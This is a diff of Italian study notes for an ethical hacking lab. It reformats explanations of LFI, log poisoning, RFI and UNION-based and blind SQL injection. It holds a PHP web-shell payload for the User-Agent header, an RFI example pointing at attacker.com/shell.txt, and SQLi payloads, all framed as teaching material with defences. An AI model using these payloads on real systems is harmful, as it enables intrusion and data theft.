@@ -1,10 +1,13 @@
 # ETHL 0x04 — Web Security p2
 
-> [!abstract] In una frase Il filo conduttore è **uno solo**: input controllato dall'attaccante che finisce dentro un _interprete_ (filesystem, HTML/JS, SQL, motore di template, shell) **senza separazione tra codice e dati**. Da qui nascono **LFI/RFI**, **A05:2025-Injection** e le sue forme — **XSS**, **SQLi**, **SSTi**, **OS Command Injection** — che spesso scalano fino a **RCE**. Poligoni: OWASP Juice Shop e PortSwigger Web Security Academy.
+> [!abstract] In una frase 
+> Il filo conduttore è **uno solo**: input controllato dall'attaccante che finisce dentro un _interprete_ (filesystem, HTML/JS, SQL, motore di template, shell) **senza separazione tra codice e dati**. Da qui nascono **LFI/RFI**, **A05:2025-Injection** e le sue forme — **XSS**, **SQLi**, **SSTi**, **OS Command Injection** — che spesso scalano fino a **RCE**. Poligoni: OWASP Juice Shop e PortSwigger Web Security Academy.
 
-> [!tip] Come usare questa nota Questo è il lab dove il prof scrive nero su bianco (slide 33): _"make sure you understand and explain what you are doing and why it worked/didn't work."_ Quindi per ogni tecnica trovi _cosa fa → perché funziona → come ci si difende_. I payload delle slide sono **riferimento da saper leggere e commentare**, non un kit. Le sfide "manually find …" (slide 25, 32, 37) restano esercizio tuo: do i mattoni concettuali, non la soluzione pronta.
+> [!tip] Come usare questa nota 
+> Questo è il lab dove il prof scrive nero su bianco (slide 33): _"make sure you understand and explain what you are doing and why it worked/didn't work."_ Quindi per ogni tecnica trovi _cosa fa → perché funziona → come ci si difende_. I payload delle slide sono **riferimento da saper leggere e commentare**, non un kit. Le sfide "manually find …" (slide 25, 32, 37) restano esercizio tuo: do i mattoni concettuali, non la soluzione pronta.
 
-> [!note] Lega col lab precedente Path traversal e file upload li hai già in [[ETHL 0x03 — Web Security p1]]. Qui path traversal ritorna come **caso particolare di LFI**, e il file upload ricompare come _vettore_ per SSTi/RCE. Le shell di [[ETHL 0x02 — Remote Access - Shells]] sono il "dopo" di una RCE.
+> [!note] Lega col lab precedente 
+> Path traversal e file upload li hai già in [[ETHL 0x03 — Web Security p1]]. Qui path traversal ritorna come **caso particolare di LFI**, e il file upload ricompare come _vettore_ per SSTi/RCE. Le shell di [[ETHL 0x02 — Remote Access - Shells]] sono il "dopo" di una RCE.
 
 ---
 
@@ -20,7 +23,8 @@ Tipi comuni (slide 11): **XSS**, **SQL/NoSQL injection**, **SSTi**, **OS command
 
 ## 1. Local File Inclusion (LFI)
 
-> [!abstract] Definizione (slide 5) Ingannare l'app per farle **caricare, renderizzare e possibilmente eseguire** contenuto da una **sorgente locale**. Tipico nei parametri (GET/POST/Cookie) che caricano file legittimi dalla directory dell'app.
+> [!abstract] Definizione (slide 5) 
+> Ingannare l'app per farle **caricare, renderizzare e possibilmente eseguire** contenuto da una **sorgente locale**. Tipico nei parametri (GET/POST/Cookie) che caricano file legittimi dalla directory dell'app.
 
 Esempi di parametri "innocenti" abusabili:
 
@@ -29,11 +33,13 @@ Esempi di parametri "innocenti" abusabili:
 /product?pic=/assets/flowers.png         (immagine parametrica)
 ```
 
-> [!info] [[LFI - Local File Inclusion]] vs [[Path Traversal]] La **path traversal** (vista in [[Ethl 0x03 web security p1]]) è un _tipo_ di LFI: usi `../` per leggere file fuori dalla cartella prevista. L'LFI è il concetto più ampio: non solo _leggere_ un file, ma farlo **includere/eseguire** dall'app. Quando il file incluso viene _interpretato_ (es. PHP), si apre la strada alla RCE.
+> [!info] [[LFI - Local File Inclusion]] vs [[Path Traversal]] 
+> La **path traversal** (vista in [[Ethl 0x03 web security p1]]) è un _tipo_ di LFI: usi `../` per leggere file fuori dalla cartella prevista. L'LFI è il concetto più ampio: non solo _leggere_ un file, ma farlo **includere/eseguire** dall'app. Quando il file incluso viene _interpretato_ (es. PHP), si apre la strada alla RCE.
 
 ### 1.1 LFI → RCE via Log Poisoning (slide 6)
 
-> [!danger] Il meccanismo — punto d'esame "[[Log poisoning]]" trasforma una semplice lettura di file in **esecuzione di codice**. Catena:
+> [!danger] Il meccanismo — punto d'esame 
+> "[[Log poisoning]]" trasforma una semplice lettura di file in **esecuzione di codice**. Catena:
 > 
 > 1. L'attaccante invia una richiesta HTTP in cui un campo **che lui controlla** (es. l'header **`User-Agent`**) contiene codice, p.es. `<?php system($_GET['c']); ?>`.
 > 2. Il web server **scrive quell'header nel log** (es. `/var/log/apache2/access.log`). Il log è ora "avvelenato".
@@ -53,9 +59,11 @@ Esempi di parametri "innocenti" abusabili:
 
 ## 2. Remote File Inclusion (RFI)
 
-> [!abstract] Definizione (slide 8) Come l'LFI, ma la sorgente è **remota**: l'app include nel rendering **server-side** un contenuto preso da un URL. _"Very similar to LFI, possibly more dangerous."_
+> [!abstract] Definizione (slide 8) 
+> Come l'LFI, ma la sorgente è **remota**: l'app include nel rendering **server-side** un contenuto preso da un URL. _"Very similar to LFI, possibly more dangerous."_
 
-> [!warning] Perché [[RFI - Remote File Inclusion]] è più pericolosa dell'LFI Nell'LFI l'attaccante deve **già** riuscire a piazzare il payload da qualche parte sul server (log, upload…). Nell'RFI **controlla interamente la sorgente remota**: punta l'app a `http://attacker.com/shell.txt` e il server scarica ed esegue _qualunque_ codice voglia, senza bisogno di un file locale avvelenato. Un passo in meno per la RCE.
+> [!warning] Perché [[RFI - Remote File Inclusion]] è più pericolosa dell'LFI 
+> Nell'LFI l'attaccante deve **già** riuscire a piazzare il payload da qualche parte sul server (log, upload…). Nell'RFI **controlla interamente la sorgente remota**: punta l'app a `http://attacker.com/shell.txt` e il server scarica ed esegue _qualunque_ codice voglia, senza bisogno di un file locale avvelenato. Un passo in meno per la RCE.
 > 
 > Mitigazione storica: i linguaggi moderni disabilitano di default l'inclusione da URL (es. PHP `allow_url_include=Off`), per questo l'RFI è meno comune oggi.
 
@@ -133,7 +141,8 @@ Con `category=Pets` la query è benigna. Ma `$c` è sotto controllo dell'attacca
 
 ### 4.3 Rilevare il DBMS via UNION (slide 29)
 
-> [!info] L'idea di UNION-based SQLi `UNION SELECT` accoda i risultati di una seconda query alla prima. Se l'output è visibile, si può estrarre informazione (es. la versione). Vincolo: la `SELECT` iniettata deve avere lo **stesso numero di colonne** (e tipi compatibili) della originale — per questo nei payload reali compaiono tanti `null`/`0` di riempimento.
+> [!info] L'idea di UNION-based SQLi 
+> `UNION SELECT` accoda i risultati di una seconda query alla prima. Se l'output è visibile, si può estrarre informazione (es. la versione). Vincolo: la `SELECT` iniettata deve avere lo **stesso numero di colonne** (e tipi compatibili) della originale — per questo nei payload reali compaiono tanti `null`/`0` di riempimento.
 
 |DBMS|Funzione versione|Payload tipo|
 |---|---|---|
@@ -234,7 +243,8 @@ x' UNION SELECT 0,null,version(),0,0,'',null,null --
 ```
 
 Per scoprire quante colonne ha la query originale si prova ad aggiungere `null` uno alla volta finché non smette di dare errore.
-##Ricognizione del Database (Scoprire i Metadati)
+
+**Ricognizione del Database (Scoprire i Metadati)**
 
 Come fa un attaccante a sapere che la tabella si chiama `users` o che le colonne sono `user` e `password`? Può eseguire una ricognizione _interrogando i metadati stessi del database_.
 
@@ -270,7 +280,8 @@ Utilizzando queste tabelle di metadati, un attaccante può mappare alla cieca l'
 
 ### 4.4 Blind SQLi e Time-based (slide 30)
 
-> [!info] Quando l'output non si vede Nella **Blind SQLi** non vedi il risultato della query iniettata (caso comune). Si **inferisce** un bit alla volta osservando se la pagina si comporta come atteso (true/false). Estrazione carattere per carattere con `SUBSTR`:
+> [!info] Quando l'output non si vede 
+> Nella **Blind SQLi** non vedi il risultato della query iniettata (caso comune). Si **inferisce** un bit alla volta osservando se la pagina si comporta come atteso (true/false). Estrazione carattere per carattere con `SUBSTR`:
 > 
 > ```
 > ... AND (SELECT SUBSTR((SELECT version()),1,1))='P'-- 
